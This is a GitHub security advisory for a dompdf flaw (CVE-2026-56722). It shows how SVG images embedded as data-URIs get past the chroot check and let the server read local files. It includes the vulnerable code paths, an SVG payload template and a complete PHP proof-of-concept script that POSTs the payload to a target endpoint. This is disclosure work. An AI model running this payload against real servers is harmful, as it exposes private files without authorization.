# [M] Dompdf: Local file read due to improper file path validation in SVG images encoded as data-URI

## Summary
Severity: Medium
Advisory: GHSA-cx96-42px-69fm
CVE: CVE-2026-56722
CWE: CWE-20, CWE-22
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-22
Source: https://github.com/advisories/GHSA-cx96-42px-69fm
Type: github-advisory

## Affected
- Packagist: `dompdf/dompdf` — affected >=0 <3.1.6

## Details
**Description:** An attacker, who controls the HTML input supplied to dompdf, can read arbitrary images from the server’s file system, bypassing the `chroot` restriction. The vulnerability is exploitable in the default configuration.
**Exploitation conditions:** An external user
**Researcher:** Nikita Sveshnikov (Positive Technologies)

## Research
dompdf restricts access to local files using the `chroot` mechanism. By default, `chroot` is set to the root directory of dompdf (`Options.php:350-351`):

_Listing 1. `chroot` settings_
```
$rootDir = realpath(__DIR__ . "/../");
$this->setChroot(array($rootDir));
// result: chroot = ["/path/to/vendor/dompdf/dompdf"]
```
When the HTML references a local file, `Options::validateLocalUri()` checks that the path resides within `сhroot`. A direct link to the file outside this directory is correctly blocked:

_Listing 2. Blocking link_
```
<!-- BLOCKED: /tmp/ is outside chroot -->
<img src="file:///tmp/secret.png">
```
### How the protection is bypassed:
An attacker wraps the link to the target file in SVG format and delivers it via `data:` URI:

_Listing 3. Wrapping link in SVG_
```
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0i...">
```
Inside the base64 payload is an SVG containing the `<image>` element that points to the target file:

_Listing 4. Pointing to the target file_
```
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     width="589" height="415">
  <image xlink:href="/tmp/secret.png" x="0" y="0" width="589" height="415"/>
</svg>
```
### Why the bypass works:
The issue is that dompdf handles the SVG twice: first through its own validator and then via  `php-svg-lib` — and the second pass does not apply the protection that the first pass does.

**Step 1.** The `data://` protocol has no validation rules (`Options.php:546-547`):

_Listing 5. Lack of rules_
```
case "data://":
    break;  // no rules
```

SVG content passes without any checks.

**Step 2.** dompdf pre‑parses the SVG and validates the links inside it (`Cache.php:137-183`), but incorrectly interprets the path of an external resource (image) reference when the SVG is data-URI encoded.

**Step 3.** When rendering, the PDF backend passes the SVG to `php-svg-lib` with external links enabled (`lib/Cpdf.php:6315-6319`):

_Listing 6. Passing the SVG_
```
$doc = new \Svg\Document();
$doc->allowExternalReferences = true;  // forced
$doc->loadFile($file);
```
`php-svg-lib` is a separate library that has no information about the `chroot` directory or the dompdf validation rules.

**Step 4.** The `<image>` handler in `php-svg-lib` blocks only `phar://`, everything else is allowed when allowExternalReferences is true (`php-svg-lib/src/Svg/Tag/Image.php:60-68`):

_Listing 7. `phar://` blocking_
```
if ($scheme === "phar"
    || ($this->document->allowExternalReferences === false && $scheme !== "data")) {
    return;
}
$this->document->getSurface()->drawImage($this->href, ...);
```
**Step 5.** `drawImage()` invokes `file_get_contents()` with no restrictions (`php-svg-lib/src/Svg/Surface/SurfaceCpdf.php:171-172`):

_Listing 8. `file_get_contents()` call_
```
$data = file_get_contents($image);  // reads ANY path
```
There is no chroot check. No protocol validation. The file is read and embedded into the PDF.

### An example of exploitation:
_Listing 9. An example of a vulnerable code (html2pdf.php)_
```
require_once __DIR__ . '/vendor/autoload.php';

$dompdf = new Dompdf\Dompdf();
$dompdf->loadHtml($_POST['html']);
$dompdf->render();
$dompdf->stream('poc.pdf', ['Attachment' => false]);
```

_Listing 10. An example attack on the vulnerable code_
```
$file = $_GET['file'] ?? '/tmp/user_files/user_1/private_image.png';

$svg = '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="589" height="415">'
     . '<image xlink:href="' . htmlspecialchars($file, ENT_QUOTES) . '" x="0" y="0" width="589" height="415"/>'
     . '</svg>';

$html = '<html><body>'
      . '<img src="data:image/svg+xml;base64,' . base64_encode($svg) . '">'
      . '</body></html>';

$url = 'http://example.com/html2pdf.php';
$data = ['html' => $html];
$headers = ["Content-type: application/x-www-form-urlencoded"];

// use key 'http' even if you send the request to https://...
$options = [
    'http' => [
        'header' => $headers,
        'method' => 'POST',
        'content' => http_build_query($data),
        'ignore_errors' => true,
    ],
];
$context = stream_context_create($options);
$response = file_get_contents($url, false, $context);
```

_Figure 1. The image was read successfully_
<img width="875" height="404" alt="image" src="https://github.com/user-attachments/assets/9a4ba3b7-df24-4c20-9dc4-55104ad905c2" />

## Credits
Nikita Sveshnikov (Positive Technologies)

## References
- https://github.com/dompdf/dompdf/security/advisories/GHSA-cx96-42px-69fm
- https://github.com/dompdf/dompdf/commit/6a58996865db05d8fede748507e50ac4b8c5bfd0
- https://github.com/dompdf/dompdf/commit/bf7b02f642e26007dedc5a22b3d6e15f9931120a
- https://github.com/dompdf/dompdf
- https://github.com/dompdf/dompdf/releases/tag/v3.1.6
